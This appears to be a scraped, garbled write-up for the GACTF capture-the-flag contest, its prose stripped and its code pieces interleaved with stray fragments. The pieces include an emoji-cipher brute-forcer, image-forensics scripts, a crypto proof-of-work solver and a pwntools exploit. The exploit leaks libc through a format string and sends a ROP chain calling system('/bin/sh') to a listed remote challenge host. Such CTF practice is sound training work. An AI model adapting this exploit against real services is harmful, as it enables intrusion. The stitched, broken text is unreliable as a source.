        root/history/.git/objects/4f/19a2121a27dc54d85408b99a04d14e6424aacf
        root/history/.git/objects/4f/b07e24c331cedbc5ff34a7addbf8db8db2e5f5
        root/history/.git/objects/66/
        root/history/.git/objects/66/737fdad4ef25d6a59a535dcbc860fefa04e15e
        root/history/.git/objects/83/
        root/history/.git/objects/83/627888a0e0160abb5e22dd136f267808410966
        root/history/.git/objects/8b/
        root/history/.git/objects/8b/f20cd0da271d9d3756f3d19695977d3defd034
        root/history/.git/objects/8f/
        root/history/.git/objects/8f/c268838f0159f418eac2d6daec2a0c75553b93
        root/history/.git/objects/99/
        root/history/.git/objects/99/33b37265f666ba6b68732738bc32599e1a87af
        root/history/.git/objects/a6/
        root/history/.git/objects/a6/ed84884a71afaa7a4e34f1b46af69cc773d6ce
        root/history/.git/objects/d1/
        root/history/.git/objects/d1/9cbc1b4d996ed3718793f7ac47a86a73bf054e
        root/history/.git/objects/d9/
        root/history/.git/objects/d9/bf7586f8c8c9f119a8a82da04cf28ddceb97b4
        root/history/.git/objects/e0/
        root/history/.git/objects/e0/2498fcc3df0e110cc01f83d69096e5ba9dd162
        root/history/.git/objects/e9/
        root/history/.git/objects/e9/418116088aefc0d7238d32cd96f0f3d36a0fc1
        root/history/.git/objects/info/
        root/history/.git/objects/pack/
        root/history/.git/refs/
        root/history/.git/refs/heads/
        root/history/.git/refs/heads/master
docker layer  Git 
 .flag.html.swp 
crymisc
ziptxt3.jpg
3.jpgbase64base64
emoji
! " # ✊ % & " ' % ( ) * + , - + . / 0 / 0 ' . " 1 2 0 0 3 % 4 5 ( ) * +
, 6 7 8 1 1 9 : ; /  ? "
codemojikey
        root/history/.git/refs/tags/
        root/history/README.md
        root/history/init.sh
        root/history/wwwroot/
        root/history/wwwroot/flag.html
        root/history/wwwroot/index.html
        root/history/wwwroot/w3.css
RUN /bin/sh /root/history/init.sh
RUN chmod +x /start.sh  \
        && rm -rf /root/*
WORKDIR /
ENTRYPOINT ["/start.sh"]
var _ = require('lodash')
// Cryptolib obtained from: https://github.com/mozilla/codemoji
var CryptoLib = require('./js/crypto-lib.js')
var emojis = require('./js/crypto-lib/emoji-list.js')
var punycode = require('punycode');
var encrypted = ' ! " # ✊ % & " ' % ( ) * + , - + . / 0 / 0 ' . " 1 2 0
0 3 % 4 5 ( ) * + , 6 7 8 1 1 9 : ; /  ? " @ ';
// Try every emoji as a key
for (var code in emojis) {
    // Convert the number to emoji
    var key = punycode.ucs2.encode([emojis[code]]);
    // Generate the emoji set
    CryptoLib.generateEmojiSubsetFrom(key)
    // Decrypt using the current key
    var decrypted = CryptoLib.decrypt(encrypted, key)
RIG
HTTP Objectstcp.stream eq 140
jsevalconsole.logbase64VBS
js(fvbnvbn, xcvsd45vbs)CVEexpxcvsd45
vbsstrshellcode
capture
    // Check if the message is all printable
    if (/^[\x20-\x7F]*$/.test(decrypted)) {
        console.log(decrypted)
    }
}
from PIL import Image, ImageDraw
with open('captured.txt','rb') as f:
    lines = f.readlines()
im = Image.new("L",(600,12000),255)
draw = ImageDraw.Draw(im)
pos = None
isDrawing = False
for line in lines:
    line = line.strip()
    if not line.startswith(b':'):
        continue
    command = line[2:]
    if not command:
        continue
    try:
        # Pen up
        if command.endswith(b" @"):
            print('Done')
        elif command[0] == ord('U'):
            if len(command)==1:
                continue
            x,y = map(int,command[1:].split(b','))
            print('Up',x,y)
            pos = (x,y)
            isDrawing = False
        # Pen down
        elif command[0] == ord('D'):
            x,y = map(int,command[1:].split(b','))
v for Vendetta
 123233
gif
            print('Down',x,y)
            pos = (x,y)
            isDrawing = True
        # Move
        elif command[0] == ord(','):
            x,y = map(int,command[1:].split(b','))
            if isDrawing:
                draw.line([pos, (x,y)], width=5)
            pos = (x,y)
            # print('Move',x,y)
    except:
        print(f'Unexpected command {command}')
im.save('res.png')
import os
import sys
from PIL import Image
def extractFrames(inGif, outFolder):
    frame = Image.open(inGif)
    nframes = 0
    while frame:
        frame.save('%s/%s-%s.png' % (outFolder, os.path.basename(inGif), 
nframes))
        nframes += 1
        try:
            frame.seek(nframes)
        except EOFError:
            break;
    return True
if __name__ == '__main__':
    image = os.path.abspath(sys.argv[1])
    dest = os.path.join(os.path.dirname(image), "dest")
    if not os.path.exists(dest):
        os.mkdir(dest)
    extractFrames(image, dest)
import imageio
pwngifbinwalkzip
nwppwn
from glob import glob
from tqdm import tqdm
im0 = imageio.imread('dest/v.gif-0.png', pilmode='RGB')
for i in range(30,150):
    for j in range(540,700):
        if sum(im0[i,j]) != 0:
            im0[i,j] = (255,255,255)
# 
for imname in tqdm(glob("dest/*.png")):
    im = imageio.imread(imname, pilmode='RGB')
    for i in range(30,150):
        for j in range(540,700):
            if sum(im[i,j]) == 0:
                print(i,j)
                im0[i,j] = (0,0,0)
imageio.imwrite('res.png',im0)
the password is V_f0r_VeNdettA_vk
now,pwn me to get the flag. 
for China 119.3.154.59 9999 
for foreign countries 45.77.72.122 9999
from pwn import *
context.arch='amd64'
# s = process("qemu-arm -g 1234 -L . ./pwn",shell=True)
s = remote('45.77.72.122',9999)
s.sendline('1')
s.send('A'*16)
s.send('A'*16)
s.sendline('2')
s.send('A'*16)
s.send('A'*16)
s.recvuntil('Current user:')
s.recv(16)
pswd = s.recv(16)
s.sendline('4')
s.sendline('2')
s.recvuntil('sign in!')
s.sendline('root')
s.send(pswd)
s.sendlineafter("You can input token:","%47$p")
s.sendlineafter("4:Logout","2")
GACTF FeedBack
Crypto
square
s.recvline()
tmp = int(s.recv(10),16)-0x16fe7
success(hex(tmp))
libc = ELF("./lib/libc.so.6")
pop_r0 = 0x0004c631+tmp
sh = 0x000d5f2c+tmp
system = libc.sym['system']+tmp
s.sendline("4")
s.sendlineafter("4:Logout","3")
payload = 'A'*36+p32(pop_r0)+p32(sh)+p32(system)
s.send(payload)
s.interactive()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
from hashlib import md5
from itertools import product
import fuckpy3
from pwn import *
from gmpy2 import iroot
# calculate solutions
x = [1,14,195] 
# http://oeis.org/A007655
for _ in range(200):
    x.append(14*x[-1]-x[-2]) 
sol = []
for x0 in x:
    y0,succ = iroot(48*x0*x0+1,2)
    assert succ
    if (y0-3)%4==0:
        sol.append((x0,(y0-3)//4))
table = string.ascii_letters + string.digits
r = remote("124.71.158.89", 8888)
# r = remote("127.1", 10000)
babycrypto
context.log_level = 'debug'
# PoW
r.recvuntil('md5')
rec = r.recvline().decode()
suffix = re.findall(r'\(str \+ (.*?)\)', rec)[0]
digest = re.findall(r'== (.*?)\n', rec)[0]
print(f"suffix: {suffix} \ndigest: {digest}")
print('Calculating hash...')
for i in product(table, repeat=5):
    prefix = ''.join(i)
    guess = prefix + suffix
    if md5(guess.encode()).hexdigest()[:5] == digest:
        print(guess)
        break
r.sendlineafter(b'Give me xxxxx: ', prefix.encode())
for i in range(100):
    r.sendlineafter(b'x: ', str(sol[i][0]))
    r.sendlineafter(b'y: ', str(sol[i][1]))
r.interactive()